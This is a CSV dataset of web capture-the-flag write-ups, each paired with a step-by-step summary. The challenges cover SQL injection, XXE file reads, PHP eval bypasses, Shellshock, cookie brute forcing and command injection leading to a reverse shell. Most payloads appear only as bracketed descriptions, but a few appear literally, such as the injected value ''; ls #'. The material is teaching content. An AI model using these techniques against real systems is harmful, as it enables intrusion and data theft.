"text","summary"
"The website shows a page like the following.

[HTML code for a webpage that includes an iframe that loads the content of another page (""/secret.html"") within the current page.]

You can discover the config.zip file with configurations.

Analyzing apache_ctf.conf file, you can find a rule that substitute a `secret` tag.

[Apache configuration for a reverse proxy server that listens on port 80, passes incoming requests to a backend server named ""main"", and applies some filters and substitutions to the server's responses. Also includes directives for setting request headers, logging, and error handling.]

So if you try to read `secret.html` page you will obtain the content with the substitution applied.

[HTTP request and response for a web page. The  response contains HTML code for a webpage that displays the text ""Protected"".]

You can use the `Range` HTTP header to exfiltrate the original `secret.html` page and get the flag.","Observe the website containing an iframe loading the content of ""/secret.html"" page.

Discover the ""config.zip"" file containing configurations.

Analyze ""apache_ctf.conf"" file and find a rule substituting a ""secret"" tag.

Try to read the ""secret.html"" page, receiving the substituted content.

Use the ""Range"" HTTP header to exfiltrate the original ""secret.html"" page.

Retrieve the flag from the exfiltrated ""secret.html"" page.
"
"The website contains a list of books with two actions available:
an excerpt to read an excerpt of the book;
read online which opens a link from another domain, not related to the challenge.

Analyzing the HTML source of the page a treasury.js file can be found; it is interesting to understand performed calls.

[Defines two functions: ""anexcerpt"" and ""readonline"" using JavaScript. The ""anexcerpt"" function creates a modal element and fetches an excerpt from a book using AJAX. The excerpt is then displayed in a text area inside the modal. The ""readonline"" function opens a new window with a link to read the book online.]

The home page is created with the following request.

[HTTP request to the server. The server responds with a 200 OK status code and returns a JSON array of books.]

The excerpt button performs a request like the following.

[HTTP GET request. The server responds with an HTTP 200 OK status code and returns a text/html response.]

The read online button simply opens a window redirecting to the link specified for the book.

A URL like the following will reveal that web application is vulnerable to SQL injection, because the result of the book with `id=1` will be printed.

[URL containing parameters for exploit SQL injection vulnerability]

The following URL will spawn a weird error.

[Warning messages indicating that there was an error in loading an XML string.]

It seems that the web application reads XML from a database.

You could use `sqlmap` to retrieve information.

[Output of a SQL injection test performed using the sqlmap tool]

So at this point you know that a `<flag>` XML element is hidden into `books` table, but not into book with `id = 1`; you can launch a custom query to exfiltrate only the `info` column for other books: `select info from ASISCTF.books where id > 1`.

[Command-line output of a successful SQL injection attack using the tool ""sqlmap""]

The flag is the following.
","Observe the website containing a list of books with ""excerpt"" and ""read online"" actions.

Analyze the HTML source and find ""treasury.js"" file to understand performed calls.

Investigate the home page request and the excerpt button request.

Discover the web application's vulnerability to SQL injection by altering the URL parameters.

Observe the error messages indicating that the web application reads XML from a database.

Use ""sqlmap"" tool to retrieve information and find the hidden `<flag>` XML element in the ""books"" table.

Perform a custom query to exfiltrate the ""info"" column for other books.

Retrieve the flag using the output from the successful SQL injection attack.
"
"Considering the XML-related error spawned previously and the hint provided into the `<flag>` element talking about a `/flag` file, you can understand that the application can be exploited via a XXE attack.

The malicious payload can be crafted and passed via the SQL injection vulnerability using a `UNION` operation. The application will parse the XML payload triggering the remote file read operation.

Let's consider a payload like the following to test the exploit.

[XML External Entity (XXE) Injection attack payload and result, where an attacker exploits a vulnerability in an XML parser to retrieve sensitive information from the target system. The payload is a malicious XML file that includes an external entity that points to a file (/etc/passwd) that the attacker wants to retrieve. The URL-encoded payload is used in the malicious URL to retrieve the file. The result shows the contents of the /etc/passwd file, indicating that the attack was successful.]

So it is possible to read remote files. PHP filters can be used to read source code via base64 encoding.

[Payload and URL-encoded payload of an XML External Entity (XXE) injection attack, along with the resulting encoded flag obtained from the attack on a vulnerable web application.]

Decoding the base64 encoded result you can obtain the flag.
","Consider the XML-related error and the hint about a `/flag` file to understand the potential for a XXE attack.

Craft a malicious payload and pass it via the SQL injection vulnerability using a `UNION` operation.

Test the exploit with a payload designed for an XXE Injection attack, attempting to retrieve a sensitive file (e.g., /etc/passwd).

Confirm the success of the attack by observing the contents of the targeted file.

Use PHP filters to read the source code via base64 encoding, preparing another payload for the XXE attack.

Execute the XXE attack using the URL-encoded payload and obtain the encoded flag from the vulnerable web application.

Decode the base64 encoded result to obtain the flag.
"
"You have to read the `flag.php` file. Connecting to the URL you can see the following source code.

[PHP code that checks if the ""view-source"" or ""warmup"" parameters are present in the URL query string. If ""view-source"" is present, the script outputs the contents of the current file. If ""warmup"" is present and contains only non-alphabetic characters and is less than or equal to 60 characters in length, the script executes the contents of the ""warmup"" parameter using the eval() function. Otherwise, the script outputs ""Try harder!"" or ""No param given"" depending on whether the ""warmup"" parameter is missing or invalid.]

There is an `eval` execution over the `warmup` GET parameter, but this parameter is checked in a very strict way, so there is no possibility to invoke functions directly.

Luckily, some techniques to bypass this kind of checks exist.

The best way to attack the endpoint is to read another HTTP GET parameter, with non-alfanumeric name, e.g. `_`.

I found two interesting websites:
[Bypass WAF - Php webshell without numbers and letters]
[`preg_match` Code Execution]

In the second website, there is the same scenario of the challenge, so I used it to craft my payload.

Using bitwise XOR operation in PHP, you can craft `_GET` string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.

[PHP code that assigns the string ""GET"" to the variable named ""_"" using bitwise XOR.]

Then you can specify the execution of the content of a GET parameter with the following code.

[PHP code that executes a function specified in the value of the ""_GET"" variable.]

So the payload that will be executed by the `eval` instruction will be the following.

Using a payload like the following, will let you to execute the `phpinfo` page.

The complete payload is the following.

The result of the attack will be the flag.","Analyze the PHP code on the target website, which includes an `eval` execution over the ""warmup"" GET parameter.

Identify the strict checks on the ""warmup"" parameter and determine that direct function invocation is not possible.

Research techniques to bypass such checks and find two relevant resources: ""Bypass WAF - Php webshell without numbers and letters"" and ""`preg_match` Code Execution.""

Use the second resource to craft a payload, creating a variable with a non-alphanumeric name and assigning it the string ""GET"" using a bitwise XOR operation in PHP.

Specify the execution of the content of a GET parameter using PHP code.

Combine the code snippets to create a complete payload that, when executed by the `eval` instruction, retrieves the flag.

Execute the attack with the crafted payload, obtaining the flag as a result.
"
"Connecting to the webpage you will get a message that says 'for API visit help page'.

The help page will give you the following information.

[HTML code for a webpage containing information about an FTP server API, including a list of endpoints and their corresponding HTTP methods, as well as the required parameters for each endpoint.]

Using the `/api/login` endpoint an error page will appear.

The error will leak the 'login_check' endpoint. Trying to use it, you will get a ""null token"".

This ""token"" can be used to authenticate on other endpoints to discover and retrieve the flag file.

The data is base64 encoded; decoding it you will find the flag.","Connect to the webpage and find a message directing you to the help page for the API.

Visit the help page to obtain information about the FTP server API, including endpoints, HTTP methods, and required parameters.

Use the `/api/login` endpoint, which results in an error page revealing the 'login_check' endpoint.

Try the 'login_check' endpoint and obtain a ""null token.""

Use the ""token"" to authenticate on other endpoints and retrieve the flag file.

Decode the base64-encoded data to find the flag.
"
"Analyzing the HTML of the page, you can discover a authentication.js.

The code at authentication.js is obfuscated.

The initial array contains base64 encoded strings.

Decoding them, you will obtain an array with some that contains these elements: 'Make a GET request to /hidden/nextstep.php','includes','length','log'

So you can discover another endpoint: nextstep.php to contact.

The HTTP response contains a ROT13 encrypted message in HTTP headers that can be easily decrypted and says: 'Make a POST request to /api/final.php'

Performing the `POST` request you will get the following answer: 'Send a post setting the variable flag'

Changing the `POST` request with a `flag` variable set will give you the flag.","Analyze the HTML of the page to discover the obfuscated authentication.js file.

Decode the base64-encoded strings in the initial array to find the elements pointing to the nextstep.php endpoint.

Make a GET request to the `/hidden/nextstep.php` endpoint.

Decrypt the ROT13 encrypted message in the HTTP headers, which directs you to make a POST request to `/api/final.php`.

Perform the POST request and receive the instruction to send a post setting the variable 'flag'.

Modify the POST request to include the 'flag' variable and obtain the flag.
"
"Connecting to the URL you will find a default Apache2 installation page.

Performing an enumeration will let you to discover the following.

[Bash commands used for web application testing and exploiting vulnerabilities, including the use of the DIRB tool for directory and file enumeration, and the discovery and exploitation of a Shellshock vulnerability in a CGI script.]

So you can use it to enumerate the root directory to find `flag.file`.

And then print it.

The content of the file is the hexadecimal representation of a GZip archive.

The flag.gz file can be re-created with an hexadecimal editor. If you open the archive you will find the `flag.txt` file with the flag.","Connect to the URL and find the default Apache2 installation page.

Perform enumeration using tools like DIRB to discover directories and files.

Enumerate the root directory to find the flag.file.

Print the contents of the `flag.file`, which is a hexadecimal representation of a GZip archive.

Re-create the `flag.gz` file using a hexadecimal editor.

Open the archive to find the `flag.txt` file containing the flag.
"
"The website prints a message.

Connecting to \robots.txt will give the following message.

So you can perform the requested HTTP GET and you will get the flag.","Visit the website and read the message.

Connect to the `/robots.txt` file.

Perform the requested HTTP GET request.

Obtain the flag.
"
"The website is an on-line calculator.

You can easily trigger an error and discover that it uses PHP eval().

So you can use PHP `system()` function to execute commands.

[HTTP POST request: with a payload that includes a command injection vulnerability]

You can list the directory.

And print the `index.php` file to discover the flag.","Visit the online calculator website.

Trigger an error to discover PHP eval() usage.

Use PHP `system()` function to execute commands.

List the directory.

Print the `index.php` file to obtain the flag.
"
"The left menu of the webpage is made up of items calling `get_life()` JavaScript method contained into a file.

[A JavaScript function that uses jQuery to make an AJAX request to a server with a given search query and populates an HTML table with the results.]

This method receives a string in input and uses it to contact a remote service endpoint, where requests are done to retrieve data.

The remote service is vulnerable to SQL injection.

At this point, you can discover that the used DBMS is MySQL.

[HTTP request and response exchanged between a client and a server]

Database schemas can be read.

Tables names for each schema can be read.

Columns for the `code` table in `alien_code` schema can be retrieved.

The content of the table can be retrieved so we get the flag.","Examine the left menu of the webpage, and identify the `get_life()` JavaScript method.

Understand that the method contacts a remote service endpoint and is vulnerable to SQL injection.

Determine that the used DBMS is MySQL.

Read database schemas.

Retrieve table names for each schema.

Obtain column names for the `code` table in the `alien_code` schema.

Retrieve the content of the table to obtain the flag.
"
"Analyzing the webpage, two strange cookies can be discovered

one is incremented at each refresh, the other contains a fixed part – at the beginning and at the end – and a variable part in the middle.

If you enumerate a great amount of cookies, you can notice that the format of variable part is the following:
previous char of the flag;
actual char of the flag;
index of the actual char.

So you can write a script to retrieve all chars and compose the flag.

","Analyze the webpage and discover two strange cookies.

Observe that one cookie increments with each refresh, while the other has a fixed part and a variable part.

Enumerate a large number of cookies and identify the format of the variable part.

Write a script to retrieve all characters and compose the flag.
"
"This was a guessing challenge and I didn't like it very much.

Trying to connect to the homepage will give you an error of HTTP method not allowed.

If you try a wrong HTTP verb, the server will return all the allowed methods.

Trying each method, you can discover that some of them, i.e. `POST` and `PUT`, will return a different result.

At this point you have to guess that some endpoints are present.

For each endpoint, you have to try all HTTP verbs in order to discover the correct one to use.

At this point, you have to guess that an `application/x-www-form-urlencoded` parameter must be used to perform the search operation

Using the `flag` value will give you another part of the flag.

Passing a random value will let you to discover that a *vim* command must be used.

Considering that the name of the parameter is `exit`, you have to discover that `:wq` is the correct value to use.

Putting everything together will give you the following.

At this point you can easily guess the first part of the flag (referred to the PDF).","Connect to the homepage and encounter an HTTP method not allowed error.

Try a wrong HTTP verb to get a list of allowed methods.

Test each method, discovering that `POST` and `PUT` return different results.

Guess the presence of endpoints and try all HTTP verbs for each one.

Guess the need for an `application/x-www-form-urlencoded` parameter to perform a search operation.

Use the `flag` value to obtain another part of the flag.

Pass a random value to discover that a vim command is required.

Determine that `:wq` is the correct value to use based on the parameter name `exit`.

Put everything together and guess the first part of the flag related to the PDF.
"
"The webpage contains the following HTML.

So you can discover the chase endpoint.

So you can discover the leftt endpoint.

So you can discover the shoot endpoint.

So you can discover the door endpoint.

So you can discover the door.js file.

So you can discover the open endpoint.

So you can discover the open_sesame.js file.

So you can discover the fight endpoint.

So you can discover the fight.js file.

So get the flag.","Discover the chase endpoint.

Discover the leftt endpoint.

Discover the shoot endpoint.

Discover the door endpoint.

Discover the door.js file.

Discover the open endpoint.

Discover the open_sesame.js file.

Discover the fight endpoint.

Discover the fight.js file.

Obtain the flag.
"
"The website has directory listing active, connecting to it two files are listed:
`login.php`
`login.php.bak`

The first page prints the message: `Not authenticated.`.

The login.php.bak contains the PHP source code.

Analyzing it, you can discover that a cookie named `otadmin` must be passed and its format must follow the following regex.

A correct value for that cookie can be the following;

If the passed value for that cookie is different from the MD5 hash of the `$cfg_pass` variable, a hint is given. You can use the correct value crafted befor to print it.

The hint is obtained by the following snippet.

Where strlen function gives 32 (i.e. the length of MD5 hashes is 32).

In that snippet, an AND operation is performed between the ASCII value of each char and the constant `0xC0` (i.e. `11000000`). Considering that the first three chars of the hint are 0, it means that the first original chars of the hash were numbers. That is due to the fact in the ASCII representation of numbers, the first most significant bits are `00` and the AND operation for that bits is performed with `11`.

So, the problem could be located in a *type juggling* in this comparison.

To exploit it, you have to guess the numbers at the beginning of the MD5 string.

A Python script can be written to exploit this task.

[Python code implementing a brute force attack against a login page. The code tries different cookie values by sending HTTP requests to the target URL until it finds the correct one that contains a flag.]

With the cookie you will discover the flag.
","Connect to the website and find `login.php` and `login.php.bak`.

Analyze `login.php.bak` to discover the required cookie format for otadmin.

Craft a correct value for the `otadmin` cookie.

Use the correct value to obtain a hint from the PHP code.

Analyze the hint and deduce that the problem could be in a type juggling comparison.

Guess the numbers at the beginning of the MD5 string.

Write a Python script to perform a brute force attack against the login page.

Discover the correct cookie value and obtain the flag.
"
"When you visit the website, you get redirected to `/?file=wc.php`. This might indicate that you can include files from the server, such as `/?file=/etc/passwd`. You can see in this file that there's a user called `ctf`, but that's not useful yet.

Moving on, you can find out that there's a `robots.txt` file at `?file=robots.txt`.
In it there is the `/?file=checkpass.php` file disallowed.

Visiting that URL, you get redirected back to `/wc.php`. However, it maybe that there's some code in `checkpass.php` that might be important. If you request it in `python` using `requests`, you can see that the response text says: ""IMPORTANT!!! The page is still under development. This has a secret, do not push this page.""

We can try to view the source of this page with the help of `php://filter`. Visit the website a base64 encoded string.

When you base64 decode this, you get some PHP code:
[This code shows the password as hardcoded, and that it's a cookie password. The page also contains an advice to not to push this page. The last line of the code redirects you to the homepage.]

Let's also check the source for `wc.php`. 

Here, you can see that a `password` cookie is being checked. Enter the password from the `$password` variable as the cookie (`w0rdc0unt123`), then you can see the webpage.

You also see in the source of `wc.php` that the input `$text` is obtained from the get param `text`, and is passed into `exec`. 
So, we can get remote code execution from here! Try with the payload: `'; ls #`

You can see the following output: ""The Character Count is: wc.php""

But, we know for a fact that there's also `robots.txt` and `checkpass.php` in this folder. You then findout that `echo exec(...)` returns only the last line of the output. We have 2 choices from here. Either we do `'; <command> | tr '\n' '' #` to replace all new-lines with spaces, throughout the rest of the exploit. Otherwise, you can try to spawn a reverse shell, and then use your server to navigate through the directories. I'm going to use the `reverse shell` method.
[Reverse shell payload: Execute a command to establish a reverse shell connection to your server]

Once you pass this in the input, you get a shell on your server!

Let's navigate through the file system and see if there's something interesting. You can see there's a folder `/ctf`. Inside that, there are a lot of folders.

There's also a a bash script called`findaas`, which you can be used to locate the file `flag.txt`. Alternatively, you can use the find command directly.

Now that you know where the flag is located, you can try to read the contents of the file using the cat command. However, when you try to read the flag file, you get a ""Permission denied"" error.

But there's a catch. You don't have permission to cat the flag. However, when you see the `README` file, it says that the password hash for `ctf` is `6f246c872cbf0b7fd7530b7aa235e67e`. You can bruteforce that using offline tools or using [crackstation.net], and find out that the password is `csictf` (maybe you could've guessed it too).

Now, you can switch to the `ctf` user using the `su` command with the password `csictf`.
Finally, you can print the flag by using the cat command with the flag file path.
","Visit website and notice the `/?file=wc.php` redirect, indicating possible file inclusion.
Explore `?file=/etc/passwd` and find `ctf` user.
Check `?file=robots.txt` and find `/?file=checkpass.php` disallowed.
Use `php://filter` to view the source of `checkpass.php`, find hardcoded password.
Check the source of `wc.php`, set the cookie with the password, and notice remote code execution.
Use a reverse shell payload to connect to the server.
Navigate through the file system to find the `flag.txt` file.
Find the `ctf` user's password hash in the `README` file and crack it.
Switch to the `ctf` user using `su` command and the cracked password.
Print the flag using the cat command with the flag file path.
"
